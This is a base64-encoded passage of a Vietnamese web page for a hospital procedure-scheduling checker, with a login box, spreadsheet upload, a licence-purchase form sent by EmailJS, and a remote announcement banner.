wvb3B0aW9uPg0KICA8b3B0aW9uPlVPQiBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+U3RhbmRhcmQgQ2hhcnRlcmVkIEJhbmsgVmlldG5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPkhvbmcgTGVvbmcgQmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+SFNCQyBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+Q0lNQiBCYW5rIFZpZXRuYW08L29wdGlvbj4NCiAgPG9wdGlvbj5DaXRpYmFuayBWaWV0bmFtPC9vcHRpb24+DQogIDxvcHRpb24+QU5aIFZpZXRuYW08L29wdGlvbj4NCjwvc2VsZWN0Pjxici8+DQoNCjxsYWJlbD5Uw6puIHTDoGkga2hv4bqjbiBuZ8aw4budaSBtdWE6PC9sYWJlbD4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iYnV5ZXJOYW1lIiByZXF1aXJlZD48YnIvPg0KICAgICAgPGxhYmVsPlTDqm4gYuG7h25oIHZp4buHbiAvIHBow7JuZyBraMOhbTo8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJob3NwaXRhbCIgcmVxdWlyZWQ+PGJyLz4NCiAgICAgIDxsYWJlbD5HbWFpbCBjw6EgbmjDom4gaG/hurdjIMSRxqFuIHbhu4s8L2xhYmVsPg0KICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBpZD0iYnV5ZXJNYWlsIiByZXF1aXJlZD48YnIvPg0KICAgICAgPGxhYmVsPlPhu5EgxJFp4buHbiB0aG/huqFpOjwvbGFiZWw+DQogICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImJ1eWVyUGhvbmUiIHJlcXVpcmVkPjxici8+PGJyLz4NCiAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV5LWJ0biI+R+G7rWk8L2J1dHRvbj4NCiAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UtYnRuIiBvbmNsaWNrPSJjbG9zZVBheW1lbnQoKSI+SOG7p3k8L2J1dHRvbj4NCiAgICA8L2Zvcm0+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCjwhLS0gUE9QVVAgWMOBQyBOSOG6rE4gR+G7rEkgLS0+DQo8ZGl2IGlkPSJjb25maXJtUG9wdXAiIGNsYXNzPSJwb3B1cC1vdmVybGF5IiBzdHlsZT0iZGlzcGxheTpub25lOyI+DQogIDxkaXYgY2xhc3M9InBvcHVwLWNvbnRlbnQgY29uZmlybS1wb3B1cCI+DQogICAgPGgzPuKchSDEkMOjIGfhu61pIHThu5tpIGLhu5kgcGjhuq1uIHRp4bq/cCBuaOG6rW4uPC9oMz4NCiAgICA8cD5WdWkgbMOybmcgxJHhu6NpIGvhur90IHF14bqjIHjDoWMgbmjhuq1uIHThu6sgYuG7mSBwaOG6rW4ga+G7uSB0aHXhuq10LjwvcD4NCiAgICA8YnV0dG9uIGNsYXNzPSJjbG9zZS1idG4iIG9uY2xpY2s9ImNsb3NlQ29uZmlybSgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCjwvYm9keT4NCjxzdHlsZT4NCi5mb3JtLXBvcHVwIHsNCiAgbWF4LWhlaWdodDogODB2aDsgICAgICAgICAgIC8qIGNoaeG6v20gdOG7kWkgxJFhIDgwJSBjaGnhu4F1IGNhbyBtw6BuIGjDrG5oICovDQogIG92ZXJmbG93LXk6IGF1dG87ICAgICAgICAgICAvKiBu4bq/dSBu4buZaSBkdW5nIGTDoGkgdGjDrCBjdeG7mW4gKi8NCiAgcGFkZGluZy1yaWdodDogMTVweDsgICAgICAgIC8qIHRyw6FuaCBj4bqvdCBjaOG7ryBraGkgY3Xhu5luICovDQogIHNjcm9sbGJhci13aWR0aDogdGhpbjsgICAgICAvKiB0aGFuaCBjdeG7mW4gbeG6o25oICovDQogIHNjcm9sbGJhci1jb2xvcjogZ29sZCB0cmFuc3BhcmVudDsNCn0NCg0KLyogbMOgbSDEkeG6uXAgdGhhbmggY3Xhu5luIHRyw6puIENocm9tZSwgRWRnZSwgU2FmYXJpICovDQouZm9ybS1wb3B1cDo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICB3aWR0aDogNnB4Ow0KfQ0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogZ29sZDsNCiAgYm9yZGVyLXJhZGl1czogNHB4Ow0KfQ0KLmZvcm0tcG9wdXA6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7DQp9DQoucG9wdXAtb3ZlcmxheSB7DQogIHBvc2l0aW9uOiBmaXhlZDsNCiAgaW5zZXQ6IDA7DQogIGJhY2tncm91bmQ6IHJnYmEoMCwwLDAsMC42KTsNCiAgZGlzcGxheTogZmxleDsNCiAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogIHotaW5kZXg6IDk5OTk7DQogIGFuaW1hdGlvbjogZmFkZUluIDAuM3MgZWFzZTsNCn0NCg0KLnBvcHVwLWNvbnRlbnQgew0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KICBib3JkZXItcmFkaXVzOiAyMHB4Ow0KICBwYWRkaW5nOiAzMHB4Ow0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOw0KICBib3gtc2hhZG93OiAwIDAgMjVweCByZ2JhKDAsMCwwLDAuMyk7DQogIGFuaW1hdGlvbjogem9vbUluIDAuM3MgZWFzZTsNCn0NCi5wb3B1cC1jb250ZW50IHsNCiAgbWF4LXdpZHRoOiA3MDBweDsNCiAgd2lkdGg6IDkwJTsNCiAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCn0NCg0KLmx1eHVyeSB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxMTEsICMyMjIpOw0KICBjb2xvcjogI2ZmZjsNCiAgbWF4LXdpZHRoOiA4MDBweDsNCn0NCg0KLnBvcHVwLXRpdGxlIHsNCiAgZm9udC1zaXplOiAyNHB4Ow0KICBtYXJnaW4tYm90dG9tOiAyMHB4Ow0KICBjb2xvcjogZ29sZDsNCiAgdGV4dC1zaGFkb3c6IDAgMCAxMHB4IGdvbGQ7DQp9DQoNCi5wcmljaW5nLWdyaWQgew0KICBkaXNwbGF5OiBmbGV4Ow0KICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgYWxpZ24taXRlbXM6IHN0cmV0Y2g7DQogIGdhcDogMjVweDsNCiAgZmxleC13cmFwOiB3cmFwOyAvKiDEkeG7gyByZXNwb25zaXZlIGtoaSBtw6BuIGjDrG5oIG5o4buPICovDQogIG1hcmdpbi10b3A6IDIwcHg7DQp9DQoNCi5wcmljZS1jYXJkIHsNCiAgZmxleDogMSAxIDE4MHB4Ow0KICBtYXgtd2lkdGg6IDIwMHB4Ow0KICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwyNTUsMjU1LDAuMDgpOw0KICBib3JkZXI6IDJweCBzb2xpZCBnb2xkOw0KICBib3JkZXItcmFkaXVzOiAxOHB4Ow0KICBwYWRkaW5nOiAyMHB4IDE1cHg7DQogIHRyYW5zaXRpb246IGFsbCAwLjNzIGVhc2U7DQogIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCg0KLnByaWNlLWNhcmQ6aG92ZXIgew0KICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTEwcHgpIHNjYWxlKDEuMDUpOw0KICBib3gtc2hhZG93OiAwIDAgMjVweCBnb2xkOw0KfQ0KDQoucHJpY2UtY2FyZCBoMyB7DQogIGZvbnQtc2l6ZTogMjBweDsNCiAgY29sb3I6ICNmZmY7DQogIG1hcmdpbi1ib3R0b206IDEwcHg7DQogIHRleHQtc2hhZG93OiAwIDAgNXB4IGdvbGQ7DQp9DQoNCi5wcmljZS1jYXJkIC5wcmljZSB7DQogIGZvbnQtc2l6ZTogMThweDsNCiAgY29sb3I6ICNmZmViM2I7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICBtYXJnaW4tYm90dG9tOiAxNXB4Ow0KfQ0KDQoNCi5wcmljZSB7DQogIGZvbnQtc2l6ZTogMjBweDsNCiAgY29sb3I6ICNmZmViM2I7DQp9DQoNCi5idXktYnRuIHsNCiAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCBnb2xkLCAjZjM5YzEyKTsNCiAgY29sb3I6ICMwMDA7DQogIGJvcmRlcjogbm9uZTsNCiAgYm9yZGVyLXJhZGl1czogMTJweDsNCiAgcGFkZGluZzogMTBweCAyMHB4Ow0KICBjdXJzb3I6IHBvaW50ZXI7DQogIGZvbnQtd2VpZ2h0OiBib2xkOw0KICB0cmFuc2l0aW9uOiAwLjNzOw0KfQ0KDQouYnV5LWJ0bjpob3ZlciB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgI2ZmZDcwMCwgI2ZmYTUwMCk7DQp9DQoNCi5jbG9zZS1idG4gew0KICBtYXJnaW4tdG9wOiAyMHB4Ow0KICBiYWNrZ3JvdW5kOiAjZTc0YzNjOw0KICBjb2xvcjogI2ZmZjsNCiAgYm9yZGVyOiBub25lOw0KICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICBwYWRkaW5nOiAxMHB4IDIwcHg7DQogIGN1cnNvcjogcG9pbnRlcjsNCn0NCg0KQGtleWZyYW1lcyBmYWRlSW4gew0KICBmcm9tIHsgb3BhY2l0eTogMDsgfSB0byB7IG9wYWNpdHk6IDE7IH0NCn0NCg0KQGtleWZyYW1lcyB6b29tSW4gew0KICBmcm9tIHsgdHJhbnNmb3JtOiBzY2FsZSgwLjkpOyBvcGFjaXR5OiAwOyB9IHRvIHsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgb3BhY2l0eTogMTsgfQ0KfQ0KDQouZm9ybS1wb3B1cCBpbnB1dCB7DQogIHdpZHRoOiA5MCU7DQogIG1hcmdpbjogNXB4IDA7DQogIHBhZGRpbmc6IDhweDsNCiAgYm9yZGVyOiAxcHggc29saWQgI2FhYTsNCiAgYm9yZGVyLXJhZGl1czogOHB4Ow0KfQ0KDQouY29uZmlybS1wb3B1cCB7DQogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICM0Q0FGNTAsICMyRTdEMzIpOw0KICBjb2xvcjogI2ZmZjsNCiAgcGFkZGluZzogMjVweCA0MHB4Ow0KICBib3JkZXItcmFkaXVzOiAyMHB4Ow0KfS5mb3JtLXBvcHVwIHNlbGVjdCB7DQogIHdpZHRoOiA5MCU7DQogIG1hcmdpbjogNXB4IDA7DQogIHBhZGRpbmc6IDhweDsNCiAgYm9yZGVyOiAxcHggc29saWQgI2FhYTsNCiAgYm9yZGVyLXJhZGl1czogOHB4Ow0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KfQ0KPC9zdHlsZT48c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsICgpID0+IHsNCiAgY29uc3QgYnV5QnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eSIpOw0KICBpZiAoYnV5QnRuKSB7DQogICAgYnV5QnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gew0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eVBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgICB9KTsNCiAgfQ0KfSk7DQoNCmZ1bmN0aW9uIGNsb3NlQnV5UG9wdXAoKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQp9DQoNCmZ1bmN0aW9uIG9wZW5QYXltZW50KHBlcmlvZCwgcHJpY2UpIHsNCiAgY2xvc2VCdXlQb3B1cCgpOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudFBvcHVwIikuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1vbmV5IikudmFsdWUgPSBgJHtwcmljZX0gKCR7cGVyaW9kfSlgOw0KfQ0KDQpmdW5jdGlvbiBjbG9zZVBheW1lbnQoKSB7DQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KfQ0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgicGF5bWVudEZvcm0iKS5hZGRFdmVudExpc3RlbmVyKCJzdWJtaXQiLCBhc3luYyAoZSkgPT4gew0KICBlLnByZXZlbnREZWZhdWx0KCk7DQogIGNvbnN0IGZvcm1EYXRhID0gew0KICAgIGFjYzogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyQWNjIikudmFsdWUsDQoJICBiYW5rOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJCYW5rIikudmFsdWUsDQogICAgbmFtZTogZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1eWVyTmFtZSIpLnZhbHVlLA0KICAgIGhvc3BpdGFsOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaG9zcGl0YWwiKS52YWx1ZSwNCiAgICBtYWlsOiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5ZXJNYWlsIikudmFsdWUsDQogICAgcGhvbmU6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXllclBob25lIikudmFsdWUsDQogICAgbW9uZXk6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJtb25leSIpLnZhbHVlDQogIH07DQoNCiAgdHJ5IHsNCmVtYWlsanMuc2VuZCgic2VydmljZV9wZ29ia3E3IiwgInRlbXBsYXRlX200dWU4NWMiLCBmb3JtRGF0YSkNCiAgLnRoZW4oZnVuY3Rpb24ocmVzcG9uc2UpIHsNCiAgICBjb25zb2xlLmxvZygiR+G7rWkgdGjDoG5oIGPDtG5nOiIsIHJlc3BvbnNlLnN0YXR1cywgcmVzcG9uc2UudGV4dCk7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBheW1lbnRQb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbmZpcm1Qb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7DQogIH0sIGZ1bmN0aW9uKGVycm9yKSB7DQogICAgY29uc29sZS5lcnJvcigiTOG7l2kgRW1haWxKUzoiLCBlcnJvcik7DQogIH0pOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJwYXltZW50UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjb25maXJtUG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICB9IGNhdGNoIHsNCiAgfQ0KfSk7DQoNCmZ1bmN0aW9uIGNsb3NlQ29uZmlybSgpIHsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNvbmZpcm1Qb3B1cCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQp9DQo8L3NjcmlwdD4NCg0KDQo8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KPGRpdiBjbGFzcz0ibG9naW4tc2VjdGlvbiIgaWQ9ImxvZ2luU2VjdGlvbiI+DQo8aDIgY2xhc3M9ImxvZ2luLXRpdGxlIj7EkMSCTkcgTkjhuqxQIEjhu4YgVEjhu5BORzwvaDI+DQo8aW5wdXQgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0idXNlcm5hbWVJbnB1dCIgcGxhY2Vob2xkZXI9IlTDqm4gxJHEg25nIG5o4bqtcCIgdHlwZT0idGV4dCIvPg0KPGlucHV0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9InBhc3N3b3JkSW5wdXQiIHBsYWNlaG9sZGVyPSJN4bqtdCBraOG6qXUiIHR5cGU9InBhc3N3b3JkIi8+DQo8YnIvPjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImxvZ2luQnRuIj7EkMSDbmcgbmjhuq1wPC9idXR0b24+DQo8ZGl2IGNsYXNzPSJsb2dpbi1lcnJvciIgaWQ9ImxvZ2luRXJyb3IiPlTDqm4gxJHEg25nIG5o4bqtcCBob+G6t2MgbeG6rXQga2jhuql1IGtow7RuZyDEkcO6bmc8L2Rpdj4NCjxici8+PGJyLz48aHIvPjxici8+PGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYnV5Ij5NdWEgVMOgaSBLaG/huqNuIC0gS8OtY2ggSG/huqF0IELhuqNuIFF1eeG7gW48L2J1dHRvbj4NCg0KPC9kaXY+DQo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiIGlkPSJtYWluQ29udGVudCI+DQo8ZGl2IGNsYXNzPSJ0b3AtYnV0dG9uLWdyb3VwIj48YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJidXkiPk11YSBC4bqjbiBRdXnhu4FuPC9idXR0b24+PGJ1dHRvbiBvbmNsaWNrPSJvcGVuUHJvY2VkdXJlU2NoZWR1bGVyKCkiY2xhc3M9ImJ0biI+VOG6oW8gZ2nhu50gdGjhu6cgdGh14bqtdDwvYnV0dG9uPg0KICA8YnV0dG9uIG9uY2xpY2s9Im9wZW5DdXN0b21pemVQYW5lbCgpIiBjbGFzcz0iYnRuIj5UdeG7syBiaeG6v248L2J1dHRvbj4NCg0KDQoNCjxidXR0b24gb25jbGljaz0ic2hvd0Ryb3Bib3hQYW5lbCgpIiBjbGFzcz0iYnRuIj5QYW5lbDwvYnV0dG9uPg0KDQogIDxidXR0b24gb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOyIgY2xhc3M9ImJ0biI+WG/DoSBDYWNoZTwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iaWQ9ImxvZ291dEJ0biI+xJDEg25nIHh14bqldDwvYnV0dG9uPg0KPC9kaXY+DQoNCg0KPGgxPiA8YSBocmVmPSJodHRwczovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiBzdHlsZT0iYWxsOiB1bnNldDsgY3Vyc29yOiBwb2ludGVyOyIgdGFyZ2V0PSJfYmxhbmsiPktp4buDbSBUcmEgVGjhu6cgVGh14bqtdDwvYT48L2gxPg0KPGRpdiBjbGFzcz0ibGlzdDEiIHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBnYXA6IDhweDsiPg0KPGkgY2xhc3M9ImZhIGZhLWJ1bGxob3JuIj48L2k+DQo8Yj48Zm9udCBjb2xvcj0icmVkIj5UaMO0bmcgYsOhbzo8L2ZvbnQ+PC9iPg0KPGRpdiBjbGFzcz0ic2Nyb2xsaW5nLXRleHQiIHN0eWxlPSJmbGV4OiAxOyBvdmVyZmxvdzogaGlkZGVuOyI+DQo8ZGl2IGNsYXNzPSJzY3JvbGxpbmctY29udGVudCIgaWQ9Im5vaWR1bmciPg0KDQo8L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KDQoNCmZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vdGhvbmdiYW8udHh0JykNCiAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQ0KICAudGhlbihkYXRhID0+IHsNCiAgICBjb25zdCBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lkdW5nJyk7DQogICAgZWwuaW5uZXJIVE1MID0gZGF0YTsNCg0KICAgIC8vIFTEg25nIMSR4buZIGTDoGkgbuG7mWkgZHVuZyDEkeG7gyDEkeG6o20gYuG6o28gY3Xhu5luDQogICAgZWwuc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgIGVsLnN0eWxlLm1pbldpZHRoID0gJzEwMCUnOw0KDQogICAgLy8gUmVzZXQgYW5pbWF0aW9uIHRvIGZvcmNlIHJlZmxvdw0KICAgIGVsLnN0eWxlLmFuaW1hdGlvbiA9ICdub25lJzsNCiAgICB2b2lkIGVsLm9mZnNldFdpZHRoOw0KICAgIGVsLnN0eWxlLmFuaW1hdGlvbiA9ICdzY3JvbGwtbGVmdCAxMHMgbGluZWFyIGluZmluaXRlJzsNCiAgfSkNCiAgLmNhdGNoKGVycm9yID0+IHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbm9pZHVuZycpLnRleHRDb250ZW50ID0gJ0tow7RuZyB0aOG7gyB04bqjaSBu4buZaSBkdW5nLic7DQogICAgY29uc29sZS5lcnJvcihlcnJvcik7DQogIH0pOw0KDQoNCjwvc2NyaXB0Pg0KPGRpdiBjbGFzcz0idXBsb2FkLXNlY3Rpb24iPjxkaXYgY2xhc3M9Im1haW5ibG9rIj4NCg0KPGlucHV0IGFjY2VwdD0iLnhsc3gsIC54bHMsIC5jc3YiIGlkPSJmaWxlSW5wdXQiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIHR5cGU9ImZpbGUiLz4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9InRyaWdnZXJCdXR0b24iPjxpIGNsYXNzPSJmYXMgZmEtZmlsZS11cGxvYWQiPjwvaT4gQ2jhu41uIGZpbGUgdGjhu6cgY8O0bmc8L2J1dHRvbj4NCjxici8+PGJyLz4NCjxpbnB1dCBkaXJlY3Rvcnk9IiIgaWQ9ImZvbGRlcklucHV0IiBtdWx0aXBsZT0iIiBzdHlsZT0iZGlzcGxheTpub25lIiB0eXBlPSJmaWxlIiB3ZWJraXRkaXJlY3Rvcnk9IiIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iZm9sZGVyQnRuIj48aSBjbGFzcz0iZmFzIGZhLWZvbGRlci1vcGVuIj48L2k+IENo4buNbiB0aMawIG3hu6VjIChU4buxIMSR4buZbmcgdMOsbSBmaWxlKTwvYnV0dG9uPg0KPGRpdiBpZD0ic2NhblN0YXR1cyIgc3R5bGU9Im1hcmdpbi10b3A6MTBweDtjb2xvcjojMzQ5OGRiO2ZvbnQtd2VpZ2h0OmJvbGQiPjwvZGl2Pg0KDQoNCjxsYWJlbD4NCjxpbnB1dCBuYW1lPSJ0aW1lT3B0aW9uIiB0eXBlPSJyYWRpbyIgdmFsdWU9Ijc6MDAiLz4gDQogICAgICAgICAgICAgICAgICAgICAgICBH4bujaSDDvSB04burIDA3OjAwDQogICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+DQo8bGFiZWw+DQo8aW5wdXQgY2hlY2tlZD0iIiBuYW1lPSJ0aW1lT3B0aW9uIiB0eXBlPSJyYWRpbyIgdmFsdWU9Ijc6MzAiLz4gDQogICAgICAgICAgICAgICAgICAgICAgICBH4bujaSDDvSB04burIDA3OjMwDQogICAgICAgICAgICAgICAgICAgIDwvbGFiZWw+DQo8YnIvPjxici8+DQoNCiAgPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBjaGVja2VkPSIxIiBpZD0iaWdub3JlQWRqYWNlbnRDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4NCjxzcGFuIGNsYXNzPSJjaHUtdGhpY2giPkLhu48gcXVhIHRo4bunIHRodeG6rXQgbGnhu4FuIGvhu4E8c3BhbiBjbGFzcz0ibm9pLWR1bmciPlZEOiA4aDAwLThoMzAgeG9hIGLDs3AuIDA4aDMwLTA4aDUwIMSRaeG7h24gY2jDom0uIGxpw6puIHRp4bq/cCBtw6Aga28gY8OhY2ggMSBwaMO6dCA8L3NwYW4+PC9zcGFuPg0KPC9sYWJlbD4NCg0KICA8bGFiZWwgc3R5bGU9Im1hcmdpbi1yaWdodDogMTBweDsiPg0KPGlucHV0IGlkPSJzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3giIHR5cGU9ImNoZWNrYm94Ii8+IA0KICAgICAgICBIaeG7g24gdGjhu4sgNiBraHVuZyBnaeG7nSBn4bujaSDDvSAgICAgICAgIA0KICAgIDwvbGFiZWw+DQoNCjxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgaWQ9InNob3dEb2N0b3JDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oDQogICAgPC9sYWJlbD48bGFiZWw+DQogIDxpbnB1dCBpZD0ic2hvd0hlcmJFcnJvckRheXNDaGVja2JveCIgdHlwZT0iY2hlY2tib3giY2hlY2tlZC8+DQogIENo4buJIGhp4buDbiB0aOG7iyBuZ8OgeSBz4bqvYyB0aHXhu5FjIGzhu5dpDQo8L2xhYmVsPg0KPGJyLz48YnIvPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYW5hbHl6ZUJ0biI+S2nhu4NtIFRyYTwvYnV0dG9uPg0KDQoNCg0KDQoNCg0KDQoNCg0KPHNjcmlwdD4NCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3QgZmlsZSA9IHRoaXMuZmlsZXNbMF07DQogICAgaWYgKGZpbGUpIHsNCiAgICAgICAgY29uc3Qgc3RhdHVzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NjYW5TdGF0dXMnKTsNCiAgICAgICAgc3RhdHVzLmlubmVySFRNTCA9IGA8aSBjbGFzcz0iZmFzIGZhLWZpbGUiPjwvaT7EkMOjIGNo4buNbiBmaWxlOiA8Yj4ke2ZpbGUubmFtZX08L2I+YDsNCiAgICAgICAgc3RhdHVzLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBzdGF0dXMuc3R5bGUuY29sb3IgPSAnIzJjM2U1MCc7DQogICAgfQ0KfSk7DQoNCjwvc2NyaXB0Pg0KPGRpdiBpZD0ic2NhblN0YXR1cyIgc3R5bGU9Im1hcmdpbi10b3A6MTBweDsgY29sb3I6IzJjM2U1MDsgZm9udC13ZWlnaHQ6Ym9sZDsgZGlzcGxheTogbm9uZTsiPjwvZGl2Pg0KPGJyLz4NCjxzcGFuIHN0eWxlPSJmb250LXNpemU6IDEycHg7Ij48aT5QaOG6p24gbeG7gW0gxJHDtGkga2hpIGPDsyB0aOG7gyBt4bqvYyBs4buXaS4gWGluIGjDo3kga2nhu4NtIHRyYSBjw6FjIHRow7RuZyB0aW4gcXVhbiB0cuG7jW5nLjwvaT48L3NwYW4+DQo8ZGl2IGlkPSJmaWxlUmVxdWlyZW1lbnRzIj48L2Rpdj4NCjwvZGl2PjwvZGl2Pg0KDQoNCjwhLS0gQuG6rlQgxJDhuqZVOiBC4bqiTkcgR0nhu5wgVFLhu5BORyBU4buqTkcgTkfGr+G7nEkgLS0+DQogIDxidXR0b24gaWQ9ImhlcmJUb2dnbGVCdG4iIGNsYXNzPSJidG4iIG9uY2xpY2s9InRvZ2dsZUhlcmJMaXN0KCkic3R5bGU9ImRpc3BsYXk6bm9uZSI+U+G6r2MgdGh14buRYyB0aGFuZzwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9InRvZ2dsZUF2YWlsYWJpbGl0eSgpIiBzdHlsZT0iZGlzcGxheTpub25lIj5HaeG7nSB0cuG7kW5nPC9idXR0b24+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJlcnJvclN1bW1hcnlCdG4iIG9uY2xpY2s9Im9wZW5FcnJvclN1bW1hcnkoKSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+DQogIFTDs20gVOG6r3QgTOG7l2kNCjwvYnV0dG9uPg0KPGRpdiBpZD0iYXZhaWxhYmlsaXR5VGFibGUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyBtYXJnaW4tYm90dG9tOiAyMHB4OyI+DQogPGRpdiBjbGFzcz0ibWFpbmJsb2siIHN0eWxlPSJtYXJnaW4tYm90dG9tOiAxMHB4OyBkaXNwbGF5Om5vbmU7IiBpZD0iYXZhaWxhYmlsaXR5RmlsdGVyQmxvY2siPg0KICA8bGFiZWwgZm9yPSJmaWx0ZXJPcGVyYXRvciI+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICA8c2VsZWN0IGlkPSJmaWx0ZXJPcGVyYXRvciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzttYXJnaW4tcmlnaHQ6MjBweDsiPjwvc2VsZWN0Pg0KDQogIDxsYWJlbCBmb3I9ImZpbHRlckRhdGUiPk5nw6B5OjwvbGF